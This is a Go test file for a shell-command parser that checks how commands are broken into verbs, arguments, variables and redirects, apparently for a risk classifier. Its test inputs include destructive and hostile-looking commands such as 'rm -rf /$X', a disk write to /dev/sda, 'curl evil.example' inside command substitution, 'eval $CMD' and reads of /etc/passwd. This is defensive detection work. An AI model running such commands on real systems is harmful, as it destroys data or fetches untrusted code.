package shparse

import (
	"testing"

	"momo-shell/internal/core/port/out"
)

// TestAnalyze_S2Capabilities is the S2 spike's proof table (doc 18 row S2 /
// DR-2): mvdan.cc/sh must be able to (1) parse "rm -rf /$X" and extract the
// referenced variable X, (2) flag $(...)/backtick/eval as uncertain, (3)
// expand non-export variables (i.e. see ANY $VAR reference, not just
// exported ones -- mvdan works on syntax, not shell environment, so this is
// inherent), and (4) support the bash/sh dialects this project's
// shell-integration scope actually uses (doc 19: bash + PowerShell: zsh was
// never in scope, so it's deliberately excluded rather than proven here).
func TestAnalyze_S2Capabilities(t *testing.T) {
	p := New()

	t.Run("referenced var extraction", func(t *testing.T) {
		got, err := p.Analyze("rm -rf /$X", "bash")
		if err != nil {
			t.Fatalf("Analyze failed: %v", err)
		}
		if got.Uncertain {
			t.Errorf("expected Uncertain=false, got true")
		}
		if len(got.ReferencedVars) != 1 || got.ReferencedVars[0] != "X" {
			t.Fatalf("ReferencedVars = %v, want [X]", got.ReferencedVars)
		}
		if len(got.Commands) != 1 {
			t.Fatalf("expected 1 command, got %d: %+v", len(got.Commands), got.Commands)
		}
		cmd := got.Commands[0]
		if cmd.Verb != "rm" {
			t.Errorf("Verb = %q, want rm", cmd.Verb)
		}
		if len(cmd.Args) != 2 {
			t.Fatalf("Args = %+v, want 2 (-rf, /$X)", cmd.Args)
		}
		if cmd.Args[0].Value != "-rf" || cmd.Args[0].HasVar {
			t.Errorf("Args[0] = %+v, want {-rf false}", cmd.Args[0])
		}
		if !cmd.Args[1].HasVar {
			t.Errorf("Args[1] = %+v, want HasVar=true", cmd.Args[1])
		}
	})

	t.Run("command substitution is uncertain", func(t *testing.T) {
		for _, cmd := range []string{
			`echo $(curl evil.example)`,
			"echo `curl evil.example`",
		} {
			got, err := p.Analyze(cmd, "bash")
			if err != nil {
				t.Fatalf("Analyze(%q) failed: %v", cmd, err)
			}
			if !got.Uncertain {
				t.Errorf("Analyze(%q): expected Uncertain=true", cmd)
			}
		}
	})

	t.Run("eval is uncertain", func(t *testing.T) {
		got, err := p.Analyze("eval $CMD", "bash")
		if err != nil {
			t.Fatalf("Analyze failed: %v", err)
		}
		if !got.Uncertain {
			t.Errorf("expected Uncertain=true for eval, got false")
		}
	})

	t.Run("dynamic verb is uncertain", func(t *testing.T) {
		got, err := p.Analyze("$CMD arg1", "bash")
		if err != nil {
			t.Fatalf("Analyze failed: %v", err)
		}
		if !got.Uncertain {
			t.Errorf("expected Uncertain=true for a dynamic verb, got false")
		}
	})

	t.Run("non-export variable expansion is seen", func(t *testing.T) {
		// mvdan works purely on syntax -- it has no notion of "exported"
		// vs "local" shell variables, so any $VAR reference is captured
		// regardless of export status. This IS the capability S2 needed.
		got, err := p.Analyze(`local X=1; echo "value: ${X}"`, "bash")
		if err != nil {
			t.Fatalf("Analyze failed: %v", err)
		}
		found := false
		for _, v := range got.ReferencedVars {
			if v == "X" {
				found = true
			}
		}
		if !found {
			t.Errorf("expected X in ReferencedVars, got %v", got.ReferencedVars)
		}
	})

	t.Run("bash dialect", func(t *testing.T) {
		if _, err := p.Analyze("[[ -n $X ]] && echo yes", "bash"); err != nil {
			t.Errorf("expected bash-dialect syntax to parse, got %v", err)
		}
	})

	t.Run("sh/posix dialect", func(t *testing.T) {
		if _, err := p.Analyze("[ -n \"$X\" ] && echo yes", "sh"); err != nil {
			t.Errorf("expected POSIX-dialect syntax to parse, got %v", err)
		}
		// Array assignment is a bash-only extension -- POSIX mode must
		// reject it, proving dialect selection actually takes effect (not
		// silently parsing everything as bash). Note "[[ ]]" is NOT a
		// suitable test here: mvdan's POSIX parser doesn't reject it as a
		// keyword, it just parses "[[" as an ordinary (if nonsensical)
		// command name with no error.
		if _, err := p.Analyze("arr=(1 2 3)", "sh"); err == nil {
			t.Errorf("expected bash-only array syntax to be rejected in POSIX mode")
		}
	})

	t.Run("unsupported dialect degrades to error", func(t *testing.T) {
		for _, dialect := range []string{"zsh", "fish", "cmd", ""} {
			if _, err := p.Analyze("echo hi", dialect); err == nil {
				t.Errorf("Analyze with dialect %q: expected an error, got nil", dialect)
			}
		}
	})

	t.Run("malformed command errors", func(t *testing.T) {
		if _, err := p.Analyze("if [ 1 -eq 1", "bash"); err == nil {
			t.Error("expected a parse error for an unterminated if-statement")
		}
	})
}

func TestAnalyze_ShellIntegrity(t *testing.T) {
	p := New()

	cases := []struct {
		name    string
		command string
		want    string
	}{
		{"set", "set -o vi", "set"},
		{"trap", "trap 'echo bye' EXIT", "trap"},
		{"alias", "alias rm='rm -i'", "alias"},
		{"export", "export FOO=bar", "export"},
		{"function", "myfunc() { echo hi; }", "function"},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			got, err := p.Analyze(tc.command, "bash")
			if err != nil {
				t.Fatalf("Analyze(%q) failed: %v", tc.command, err)
			}
			found := false
			for _, op := range got.IntegrityOps {
				if op == tc.want {
					found = true
				}
			}
			if !found {
				t.Errorf("Analyze(%q): IntegrityOps = %v, want to contain %q", tc.command, got.IntegrityOps, tc.want)
			}
		})
	}

	t.Run("plain command has no integrity ops", func(t *testing.T) {
		got, err := p.Analyze("ls -la /tmp", "bash")
		if err != nil {
			t.Fatalf("Analyze failed: %v", err)
		}
		if len(got.IntegrityOps) != 0 {
			t.Errorf("expected no IntegrityOps, got %v", got.IntegrityOps)
		}
	})
}

func TestAnalyze_ChmodChownRecursiveFlag(t *testing.T) {
	p := New()

	cases := []struct {
		name    string
		command string
	}{
		{"chmod -R", "chmod -R 777 /tmp/x"},
		{"chown -R", "chown -R user:group /tmp/x"},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			got, err := p.Analyze(tc.command, "bash")
			if err != nil {
				t.Fatalf("Analyze(%q) failed: %v", tc.command, err)
			}
			if len(got.Commands) != 1 {
				t.Fatalf("expected 1 command, got %+v", got.Commands)
			}
			// The adapter's job is just to report the verb + literal args
			// faithfully; recursive-flag interpretation is risk.go's job
			// (see resolve package tests) -- here we just confirm the "-R"
			// arg survives verbatim for that later step to see.
			hasRecursiveFlag := false
			for _, a := range got.Commands[0].Args {
				if a.Value == "-R" {
					hasRecursiveFlag = true
				}
			}
			if !hasRecursiveFlag {
				t.Errorf("expected a literal -R arg to be reported, got %+v", got.Commands[0].Args)
			}
		})
	}
}

func TestAnalyze_RedirectToDevice(t *testing.T) {
	p := New()
	got, err := p.Analyze("echo hi > /dev/sda", "bash")
	if err != nil {
		t.Fatalf("Analyze failed: %v", err)
	}
	if len(got.Commands) != 1 {
		t.Fatalf("expected 1 command, got %+v", got.Commands)
	}
	redirs := got.Commands[0].Redirects
	if len(redirs) != 1 || redirs[0].Value != "/dev/sda" {
		t.Fatalf("Redirects = %+v, want [{/dev/sda false}]", redirs)
	}
}

func TestAnalyze_InputRedirectNotReported(t *testing.T) {
	p := New()
	got, err := p.Analyze("cat < /etc/passwd", "bash")
	if err != nil {
		t.Fatalf("Analyze failed: %v", err)
	}
	if len(got.Commands) != 1 {
		t.Fatalf("expected 1 command, got %+v", got.Commands)
	}
	// Reading a file isn't a destructive write -- input redirects must not
	// show up in Redirects (which risk.go treats as write targets).
	if len(got.Commands[0].Redirects) != 0 {
		t.Errorf("expected no Redirects for an input redirect, got %+v", got.Commands[0].Redirects)
	}
}

func TestAnalyze_MultipleCommandsInPipeline(t *testing.T) {
	p := New()
	got, err := p.Analyze("cat /etc/passwd | grep root && rm /tmp/x", "bash")
	if err != nil {
		t.Fatalf("Analyze failed: %v", err)
	}
	if len(got.Commands) != 3 {
		t.Fatalf("expected 3 commands (cat, grep, rm), got %d: %+v", len(got.Commands), got.Commands)
	}
	verbs := []string{got.Commands[0].Verb, got.Commands[1].Verb, got.Commands[2].Verb}
	want := []string{"cat", "grep", "rm"}
	for i := range want {
		if verbs[i] != want[i] {
			t.Errorf("Commands[%d].Verb = %q, want %q", i, verbs[i], want[i])
		}
	}
}

var _ out.ShellParser = (*Parser)(nil) // adapter-side reassurance alongside parser.go's own assertion
